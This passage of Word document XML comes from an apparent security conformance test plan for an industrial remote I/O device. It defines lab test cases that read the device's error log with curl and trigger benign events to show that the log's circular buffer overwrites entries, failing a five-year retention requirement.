              <w:t>reuse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="fr-FR"/>
              </w:rPr>
              <w:t xml:space="preserve"> TC-RQ003-04)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C71A2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SVV-3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="37356641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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Boundary notes:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>firmware-install self-erasing</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> clearing is tested in </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-008 (TC-RQ008-02)</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, not here; </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>version-history retention</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-013</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>access restriction</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>RQ-014</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. RQ-012 tests only </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>general-log retention duration/capacity</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A0AEE6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Environment binding: all over the </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>management path</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (Pi eth1 = 192.168.50.10 → IoT-Core); event generation via benign self-detected faults (brief </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>SysCom</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> interruptions) on the OT path; power control for warm/cold resets. Isolated Zone-B, PLC-monitored. </w:t>
      </w:r>
      <w:hyperlink r:id="rId308" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>ifmworld</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-m...epoint.com]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId309" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Security_T</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>rk_Kali_EN</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | Word]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D626B86" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="00AE921B">
          <v:rect id="_x0000_i1818" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C3AF79" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Step 3 — Two-Level Test Catalog (Scope-Corrected)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="752F8CD8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>Full entries for the two decisive conformance-disproof tests: capacity/overflow (TS-1 → G-2) and reset-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (TS-2 → G-1). TS-3 (mandated-reboot) and TS-4 (time-attribution, reuse TC-RQ003-04) follow established templates.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3B3D25" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="4427CD2E">
          <v:rect id="_x0000_i1819" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A585E3" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ012-01 — Circular-Buffer Overflow / Capacity Conflict (G-2 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340E4050" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282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741"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="015E36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C617A7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862C4C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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="26917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04824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C5BFB" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>TC-RQ012-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="6C2424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2B280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696CE" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve">RQ-012 (EHSR 1.1.9 §3 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>retention</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>) → CR 2.9 / CR 2.10 → Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="4EC0B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4CB67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BFCDE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>Repudiation (loss of retained intervention data)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7249B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EE350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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E5728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35612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SVV-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:t xml:space="preserve"> (Threat-Mitigation </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="56804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45855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D5F5E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Demonstrate that the tracing log is a </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>fixed-capacity circular buffer</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> that </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>overwrites the oldest entries</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> once full, so intervention data is not retained for any duration bounded by event volume — conflicting with the 5-year mandate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="59EE2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A0872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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282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2C50C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1. Read and record the current log. 2. Generate a controlled series of &gt;N </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>loggable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> events (N = documented capacity, ≥100), each individually identifiable. 3. Read the log after each block. 4. Confirm the earliest events are overwritten and the buffer never exceeds its fixed size.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="4454C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3087B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291698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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the log retains all events for the retention window. </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = FAIL:</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the buffer caps at its fixed size and overwrites oldest-first → confirms </w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>G-2</w:t>
            </w:r>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> and CR 2.9/2.10 non-conformity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="02CD75EB" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282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E57282" w:rsidRPr="00E57282" w14:paraId="3AFDF2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317810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D7C06D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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="7D6EF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A6830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Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E5728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BC770" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>TC-RQ012-01</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="219B5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C7FE6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35406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DUT 192.168.0.2; Pi </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>mgmt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> eth1 = 192.168.50.10; OT path to induce events</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="0D9C5C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1D08E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AD1B8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curl (log read), scripted event generator (brief repeated </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E57282">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> interruptions / recoverable channel faults), diff tooling</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="42969B55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># TC-RQ012-01 Overflow the circular buffer and confirm oldest-first overwrite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26D1E220" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId310" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="pt-BR"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="pt-BR"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1201_log_00.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDC9BB9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# --- induce ~120 individually-tagged </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>loggable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> events (exceeds &gt;=100 capacity) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164EE798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for </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> in $(seq 1 120); do</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C176E75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lastRenderedPageBreak/>
        <w:t>./induce_event.sh $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> # trigger a benign, recoverable, acknowledgeable event #i</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F58034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if (( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> % 20 == 0 )); then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4434EA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curl -s </w:t>
      </w:r>
      <w:hyperlink r:id="rId311" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>http://192.168.0.2/devicestatus/errorlog/loglist</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -o TC1201_log_$i.json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65AECFAB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>fi</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E61CB14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>done</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B8B70E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>python3 analyse_overflow.py TC1201_log_*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | tee TC1201_overflow.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31534012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# </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>analyse</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: entry count never exceeds capacity; earliest tags disappear (overwritten)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CDBDEA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| </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Expected</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | Entry count plateaus at the fixed capacity (≥100); earliest events overwritten (circular buffer, SRIO-10663). | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Buffer caps + overwrites oldest (G-2 confirmed) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC1201_log_*.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> series, TC1201_overflow.txt, entry-count-vs-events plot | </w:t>
      </w:r>
      <w:hyperlink r:id="rId312" w:history="1">
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00E57282">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CFBAFDF" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:pict w14:anchorId="45F74078">
          <v:rect id="_x0000_i1820" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E96CD23" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>TC-RQ012-02 — Reset-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Behaviour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E57282">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Matrix: Cold-Start Deletion &amp; Warm-Reset Clarification (G-1 proof)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A488A5D" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E57282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7736"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="1EBAEF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F0D2AD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CEF5DE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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="43E3C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28236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9F1F4" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>TC-RQ012-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00E57282" w:rsidRPr="00E57282" w14:paraId="5A96BC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695A8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8093B" w14:textId="77777777" w:rsidR="00E57282" w:rsidRPr="00E57282" w:rsidRDefault="00E57282" w:rsidP="00E57282">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00E57282">
              <w:t>RQ-012 → CR 3.9 / CR 2.9 → Asset I</w:t>
            </w:r>
          </w:p>
        </w:tc>
